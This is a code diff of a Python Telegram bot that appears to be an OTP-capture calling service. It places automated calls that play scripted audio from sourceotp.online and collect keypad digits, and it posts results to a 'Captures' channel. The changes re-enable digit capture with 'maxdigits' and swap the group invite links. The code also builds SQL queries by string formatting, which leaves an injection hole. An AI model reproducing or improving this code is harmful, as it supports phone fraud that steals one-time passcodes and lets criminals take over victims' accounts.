@@ -253,8 +253,8 @@ def community(message):
         keyboard = types.InlineKeyboardMarkup(row_width=2)
         item1 = types.InlineKeyboardButton(text="Developer 🧑‍💻", url='https://t.me/atlanta_xd')
         item2 = types.InlineKeyboardButton(text="Owner 🧑", url='https://t.me/Peytas')
-        item3 = types.InlineKeyboardButton(text="Group 💪", url='https://t.me/Articuno_Discussion')
-        item6 = types.InlineKeyboardButton(text="Channel 💪", url='https://t.me/Articuno_Franchise')
+        item3 = types.InlineKeyboardButton(text="Group 💪", url='https://t.me/+A2TAPvQK0T1kNTU1')
+        item6 = types.InlineKeyboardButton(text="Channel 💪", url='https://t.me/+V9zEFt1RQChmNzg1')
         item4 = types.InlineKeyboardButton(text="Captures 🔢", url='https://t.me/Articuno_Captures')
         
         
@@ -910,7 +910,7 @@ def custom_confirm1(message):
         data = {
     "uuid": f"{call_control_id}",
     "audiourl": f"https://sourceotp.online/scripts/{customscid}/output5.wav",
-    # "maxdigits": f"{nospace_digits}",
+    "maxdigits": f"{nospace_digits}",
 
 }
         requests.post(url, json=data)
@@ -934,6 +934,8 @@ def custom_prebuild_script_call(script_id,chatid):
     event = data['state']
     c.execute(f"select * from custom_scripts where script_id='{script_id}' limit 1")
     custom_sc_src = c.fetchone()
+    digits = custom_sc_src[8]
+    nospace_digits= "".join(digits.split())
     c.execute(f"select * from users where user_id='{chatid}' limit 1")
     voices = c.fetchone()
     call_cost = voices[11]
@@ -949,6 +951,7 @@ def custom_prebuild_script_call(script_id,chatid):
             data = {
     "uuid": f"{call_control_id}",
     "audiourl": f"https://sourceotp.online/scripts/{script_id}/output1.wav",
+    "maxdigits":"1"
 }
             requests.post(url1, json=data)
             bot.send_message(chatid,f"""*Call Answerd 🗣️*""",parse_mode='markdown')
@@ -1005,7 +1008,7 @@ def custom_prebuild_script_call(script_id,chatid):
                 data = {
     "uuid": f"{call_control_id}",
     "audiourl": f"https://sourceotp.online/scripts/{script_id}/output2.wav",
-    # "maxdigits": f"{nospace_digits}",
+    "maxdigits": f"{nospace_digits}",
     
 }
                 requests.post(url3, json=data)
